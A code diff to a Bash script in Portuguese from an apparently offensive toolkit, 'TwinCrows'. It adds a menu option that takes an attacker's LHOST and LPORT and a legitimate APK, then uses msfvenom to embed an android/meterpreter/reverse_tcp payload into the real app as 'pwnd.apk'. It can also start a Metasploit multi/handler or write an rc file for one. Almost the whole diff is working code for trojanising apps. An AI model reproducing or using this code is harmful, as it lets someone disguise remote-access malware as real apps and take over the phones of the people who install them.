@@ -1198,7 +1198,8 @@ tc_payload() {
 			do
 
 			echo -e "${verde}"
-			echo -e "1 - TwinCrwos.app - android/meterpreter/reverse_tcp"
+			echo -e "1 - Criar apk malicioso - android/meterpreter/reverse_tcp"
+			echo -e "2 - Embutir meterpreter em um apk real"
 			echo
 			echo -e "0 - Voltar"
 
@@ -1235,6 +1236,7 @@ tc_payload() {
 					echo -e "${azulbold}\nAssinano o aplicativo...${normal}\n"
 					keytool -genkey -V -keystore $TCPayloads/tc.keystore -storepass twincrows -alias tc -keypass twincrows -dname "CN=TwinCrows,O=Android,C=BR" -keyalg RSA -keysize 2048 -validity 10000 2> /dev/null 
 					jarsigner -verbose -keystore $TCPayloads/tc.keystore -storepass twincrows -keypass twincrows -digestalg SHA1 -sigalg MD5withRSA $TCPayloads/TwinCrows.apk tc 2> /dev/null 
+					apktool empty-framework-dir --force 2> /dev/null
 					rm $TCPayloads/tc.keystore
 					echo -e "${azulbold}\n\nAplicativo assinado com sucesso! Salvo em $TCPayloads/TwinCrows.apk\n${normal}"
 					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
@@ -1246,6 +1248,67 @@ tc_payload() {
                                 		exec $TCPath/TwinCrows
                         		fi
 				;;
+				"2")
+					echo -e "${cinza}Este payload insere um codigo malicioso com meterpreter/reverse_tcp num aplicativo real. Importante ressaltar que aplicativos mais novos nao permitem descompilacao, portanto procure uma versao mais antiga que pode ser encontrada em https://www.apkmirror.com.\n"
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o caminho do apk real: ${normalbold}"
+					read apk
+					echo -e "${azulbold}\nAplicativo sendo modificado, aguarde...\n${normal}"
+					SILENTJAVAOPTIONS="$JAVA_OPTIONS"
+					unset JAVAOPTIONS
+					alias='java "$SILENTJAVA_OPTIONS"'
+					msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o  $TCPayloads/pwnd.apk &> /dev/null
+					ver=$(ls $TCPayloads | grep pwnd.apk | wc -l)
+					if [ "$ver" == 0 ]
+					then
+						echo -e "${vermbold}Este aplicativo nao permite decompilacao, procure por uma versao mais antiga.${normal}"
+						printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        	read opcao
+                        			if [ "$opcao" == "s" ]
+                        			then
+                                			tc_payload
+                        			else
+                                			exec $TCPath/TwinCrows
+                        			fi
+					else
+						echo -e "${azulbold}Aplicativo gerado com sucesso!\nAplicativo salvo em $TCPayloads/pwnd.apk${normal}"
+					fi
+					apktool empty-framework-dir --force 2> /dev/null
+					printf "${verde}Deseja iniciar o MSFConsole? [s/n]: ${normalbold}"
+					read msf
+					if [ "$msf" == "s" ]
+					then
+						xterm  -fa monaco -fs 13 -bg black -T " TwinCrows - MSFConsole " -geometry 110x23-0+0 -e "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp ; set LHOST $lhost ; set LPORT $lport ; exploit ; exit -y'" &
+					else
+						printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+						read rc
+						if [ "$rc" == "s" ]
+						then
+							echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/android_payload.rc${normal}"
+							echo -e "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/android_payload.rc
+						fi
+					fi
+
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
 			esac
 			done
 		;;
